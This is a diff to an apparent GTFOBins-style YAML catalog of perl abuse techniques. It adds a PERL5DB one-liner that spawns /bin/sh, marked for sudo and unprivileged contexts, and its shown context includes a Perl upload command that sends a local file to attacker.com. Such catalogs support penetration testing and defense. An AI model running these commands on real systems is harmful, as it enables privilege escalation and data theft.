@@ -33,6 +33,13 @@ functions:
         - CAP_SETUID
       sudo:
       unprivileged:
+  - code: |-
+      PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl /dev/null
+    comment: |-
+      The `/dev/null` part can be omitted, just use `Ctrl-D` in order to spawn the shell.
+    contexts:
+      sudo:
+      unprivileged:
   upload:
   - code: |-
       perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>"attacker.com", PeerPort=>80, Proto=>"tcp") or die;open(my $file, "<", "/path/to/input-file") or die;$content = join("", <$file>);close($file);$headers = "POST / HTTP/1.1\r\nHost: attacker.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " . length($content) . "\r\nConnection: close\r\n\r\n";print $s $headers . $content;while (<$s>) { }close($s);'
